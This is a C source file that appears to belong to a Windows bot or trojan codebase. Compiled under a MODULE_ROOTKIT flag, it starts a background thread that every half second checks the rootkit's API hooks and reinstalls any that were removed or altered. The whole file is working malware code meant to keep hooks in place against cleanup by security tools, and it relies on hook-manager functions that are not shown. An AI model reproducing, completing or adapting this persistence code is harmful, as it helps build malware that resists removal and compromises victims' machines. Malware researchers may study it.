#include "hook_persistence.h"

#ifdef MODULE_ROOTKIT
#include "hook_manager.h"
#include "..\common\utils.h"

extern bot_t bot;

DWORD WINAPI HookPersistence_Thread(LPVOID p)
{
	DWORD dwHookCount, i;

	while(TRUE)
	{
		HookManagerThreadSyncBegin();

		if((dwHookCount = GetHookCount()) > 0)
		{
			for(i = 0; i < dwHookCount; i++)
			{
				if(IsHookManipulated(i))
				{
					ReinstallHook(i);
				}
			}
		}

		HookManagerThreadSyncFinish();

		Utils_Sleep(500);
	}

	return 0;
}

void WINAPI StartHookPersistence(void)
{
	HANDLE hThread;

	if((hThread = CWA(CreateThread)(0, 0, 0, (LPTHREAD_START_ROUTINE)HookPersistence_Thread, 0, 0)) != 0)
		CWA(NtClose)(hThread);
}

#endif